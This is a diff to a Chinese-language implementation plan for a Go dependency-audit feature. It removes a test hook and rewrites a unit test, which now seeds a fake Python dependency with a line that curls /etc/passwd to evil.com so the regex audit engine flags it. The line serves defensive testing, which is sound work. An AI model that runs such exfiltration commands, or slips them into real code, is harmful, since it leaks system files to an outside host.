@@ -2802,6 +2802,41 @@ git commit -m "fix(deps): route the dependency panic path to reportDeps"
 
 ---
 
+### Task 8 编码前预审·第二轮（2026-10-08，逐符号核对）
+
+**(P) `depsAuditFunc` 是为测试新造的生产可达接缝，已删除——模型审计的既有测试证明不必如此。**
+
+| 事实 | 依据 |
+| :--- | :--- |
+| `setupTestState` 装的引擎是 `codeaudit.DefaultEngine()` | `handler_test.go:73-76` |
+| 它是**正则基线**，不需要 semgrep 二进制 | `engine.go:154-156`：`regexEngine{scanner: DefaultScanner()}` |
+| 模型审计**没有**任何测试钩子，直接调真实引擎 | `import_processing.go:638` |
+| 其用例喂一个命中规则的 `train.py`，跑真引擎，用 httptest 平台断言 `code=1` | `audit_model_import_test.go:275`（`TestAuditAndReportModelImportStaticFail`） |
+| controller 包内可直接引用 `reportAuditEndpoint` | `report.go:11` |
+
+初稿的钩子不只是风格问题，它有实质代价：**它恰好跳过 §12 要覆盖的三段**——真
+`codeaudit.GenerateAuditReport` 调用、`auditReportJSON(audit)` 投影、以及
+`ReportAuditScoped(..., "deps")` 的 scope 传递。钩子分支里 `summary` 是测试给的字符串、`report`
+直接传 `""`，于是"审计报告确实以 `scope=deps` 发出"这条**在 Task 8 完全没被验证**，而它正是 §8 里
+平台侧区分两类报告的唯一依据。改成真引擎后，一个用例同时钉住清除行为与上报形状。已按此改写
+Step 1 的用例与 Step 3 的实现块。
+
+**(P2) 顺带核实（结论：保留，不是冗余）**：`runDepsAudit` 在锁内置
+`ActiveAuditTaskID`/`ActiveAuditRequestID`/`CurrentAuditOp="auditing"`/`AuditRunning=true`，
+与 `startModelAuditAsync`（`import_processing.go:589-594`）同形。`tryAcquireTaskTyped` 里有一条
+**专为依赖导入而写**的门禁：`if taskType == "model_import" || taskType == "deps_import" { if s.isAuditBusyLocked() { …409… } }`
+（`route.go:645-655`，注释明写"两者都驱动共享审计子系统"）。置位是那条约定的组成部分，删掉会让
+注释变成假话。
+
+**(P3) 订正本日志前文一处措辞**：`clearAuditState()` 只清
+`ActiveAuditTaskID`/`ActiveAuditRequestID`/`CurrentAuditOp`/`AuditRunning`（`resetAuditStateLocked`，
+`route.go:553-558`），**不碰 `LastAudit`**，所以调用它不会覆盖模型审计在 `/v1/taa/status` 里的结果。
+上文"Task 8/10 编码前预审发现"表里那句"`clearAuditState` 同样不适用于本路径"**措辞过宽**，准确说法是
+"**不需要 `setLastAudit`**"；`clearAuditState` 本身是正确的收尾——模型路径同样以它收尾
+（`import_processing.go:597-598` 的 `runAsyncSafe` 清理回调）。
+
+---
+
 ## Task 8: 依赖审计（fail-closed，scope=deps）
 
 **Files:**
@@ -2814,27 +2849,62 @@ git commit -m "fix(deps): route the dependency panic path to reportDeps"
 追加到 `internal/controller/deps_import_test.go`：
 
 ```go
-// TestRunDepsAuditRemovesDirOnFailure pins the fail-closed cleanup: a rejected dependency
-// set must not survive on disk. It deliberately asserts nothing about state — the binding
-// is cleared by rollbackDepsImport, not by the audit, and is covered separately below.
+// TestRunDepsAuditRemovesDirOnFailure pins the fail-closed cleanup and the scope=deps report
+// together. It drives the real engine (the regex baseline setupTestState installs) exactly as
+// TestAuditAndReportModelImportStaticFail does for the model path, so the assertion covers the
+// engine call, the JSON projection and the report as one unit. It asserts nothing about the
+// binding: that is rollbackDepsImport's job and is covered by the pipeline tests.
 func TestRunDepsAuditRemovesDirOnFailure(t *testing.T) {
 	state, _ := setupTestState(t)
 	state.Security.ScanEnabled = true
+	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
 
-	origAudit := depsAuditFunc
-	t.Cleanup(func() { depsAuditFunc = origAudit })
-	depsAuditFunc = func(dir string) (bool, string) { return false, "命中 HIGH 风险规则" }
+	received := make(chan struct {
+		Code  int    `json:"code"`
+		Scope string `json:"scope"`
+	}, 1)
+	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		if r.URL.Path != reportAuditEndpoint {
+			return
+		}
+		var rr struct {
+			Code  int    `json:"code"`
+			Scope string `json:"scope"`
+		}
+		_ = json.NewDecoder(r.Body).Decode(&rr)
+		received <- rr
+		w.WriteHeader(http.StatusOK)
+	}))
+	defer platform.Close()
+	state.PlatformIP = platform.URL
+	state.DockerID = "docker-test"
 
-	depsDir := t.TempDir()
-	if err := os.WriteFile(filepath.Join(depsDir, "pkg.py"), []byte("x"), 0o644); err != nil {
-		t.Fatalf("seed: %v", err)
+	depsDir := filepath.Join(state.Security.GetDepsDir(), "evilhash")
+	if err := os.MkdirAll(depsDir, 0o755); err != nil {
+		t.Fatalf("seed dir: %v", err)
+	}
+	code := "import subprocess\nsubprocess.run([\"curl\", \"http://evil.com\", \"-d\", \"@/etc/passwd\"])\n"
+	if err := os.WriteFile(filepath.Join(depsDir, "pkg.py"), []byte(code), 0o644); err != nil {
+		t.Fatalf("seed file: %v", err)
 	}
 
-	if passed := state.runDepsAudit(depsImportRequest{RequestID: "r", TaskID: "t"}, depsDir); passed {
+	if passed := state.runDepsAudit(depsImportRequest{RequestID: "req-1", TaskID: "task-1"}, depsDir); passed {
 		t.Fatal("runDepsAudit returned true for a failing audit")
 	}
 	if _, err := os.Stat(depsDir); !os.IsNotExist(err) {
 		t.Fatalf("deps dir still present after a failed audit: %v", err)
+	}
+
+	select {
+	case rr := <-received:
+		if rr.Code != 1 {
+			t.Fatalf("code = %d, want 1 (static audit failure)", rr.Code)
+		}
+		if rr.Scope != "deps" {
+			t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
+		}
+	case <-time.After(5 * time.Second):
+		t.Fatal("timed out waiting for the scope=deps audit report")
 	}
 }
 
@@ -2917,29 +2987,17 @@ import (
 	"taa/internal/codeaudit"
 )
 
-// depsAuditFunc 是依赖审计的可替换钩子，签名返回 (passed, summary)。
-// 生产路径指向真实引擎；单测替换它以避开 Semgrep / LLM 依赖。
-var depsAuditFunc func(dir string) (bool, string)
-
 // runDepsAudit 对安装后的依赖目录执行与模型代码同引擎、同策略的审计，并以
 // scope="deps" 上报。审计未通过时物理清除依赖目录——fail-closed 语义下，
 // 被拒的依赖不应留在磁盘上。
-// 审计状态位的置位/清位沿用 startModelAuditAsync（import_processing.go:585）的既有写法：
+// 审计状态位的置位/清位沿用 startModelAuditAsync（import_processing.go:589）的既有写法：
 // startModelAuditAsync 在锁内写四个字段，审计体在首尾用 setCurrentAuditOp 切换 current_op。
+//
+// 本函数不设测试钩子：模型审计（auditAndReportModelImport）同样没有钩子，它的用例直接喂一个
+// 命中规则的 train.py 跑真引擎并断言上报（audit_model_import_test.go:275）。依赖审计照同一手法
+// 测，断言才能覆盖引擎调用、auditReportJSON 投影、scope=deps 上报三段；加钩子恰好跳过这三段，
+// 只剩"清除目录"这一步被覆盖。
 func (s *TAAState) runDepsAudit(req depsImportRequest, depsDir string) bool {
-	// Test hook: when set it fully replaces the real engine, so unit tests never
-	// invoke Semgrep or the LLM verifier.
-	if depsAuditFunc != nil {
-		passed, summary := depsAuditFunc(depsDir)
-		code := 0
-		if !passed {
-			code = 1
-			_ = os.RemoveAll(depsDir)
-		}
-		s.reportAuditScopedAsync(req.RequestID, req.TaskID, code, summary, "", "deps")
-		return passed
-	}
-
 	s.mu.Lock()
 	s.ActiveAuditTaskID = req.TaskID
 	s.ActiveAuditRequestID = req.RequestID
@@ -2981,9 +3039,11 @@ func (s *TAAState) runDepsAudit(req depsImportRequest, depsDir string) bool {
 }
 ```
 
-`depsAuditFunc` 只在单测中赋值，生产路径下为 `nil`，因此上面的判断在生产中恒不成立。
-它存在的唯一理由是让 `TestRunDepsAuditRemovesDirOnFailure` 能在不引入 Semgrep 与
-LLM 依赖的前提下验证 fail-closed 的清除行为。
+无钩子不影响可测性：`setupTestState`（`handler_test.go:73-76`）装的引擎是
+`codeaudit.DefaultEngine()`，即**正则基线**（`engine.go:154-156`），不需要 Semgrep 二进制；
+LLM 侧用 `LLMConfig{Enabled: false}` 关掉，`cfg.Enabled && cfg.FailClosed` 的探测分支随之不进入。
+（若日后把 `DefaultEngine` 换成 Semgrep，本用例会随之需要 semgrep 二进制——届时按 `codeScanEngine`
+在测试里显式指定正则基线即可，不必为此恢复钩子。）
 
 **清理语义的差异（有意为之）**：模型审计失败时调用 `cleanDirContents(dir)`——只清空内容、
 保留目录本身，因为 `ModelDir` 是长期存在的固定路径。依赖目录是**内容寻址**的
@@ -3016,7 +3076,7 @@ func (s *TAAState) reportAuditScopedAsync(requestID, taskID string, code int, ms
 
 - [ ] **Step 4: 删除 Task 6 的最小 `runDepsAudit`**
 
-`deps_import.go` 中 Task 6 添加的返回 `true` 的最小 `runDepsAudit` 必须删除，避免重复定义
+`deps_import.go` 中 Task 6 添加的返回 **`false`**（fail-closed 桩）的最小 `runDepsAudit` 必须删除，避免重复定义
 导致编译失败。
 
 - [ ] **Step 5: 运行测试确认通过**
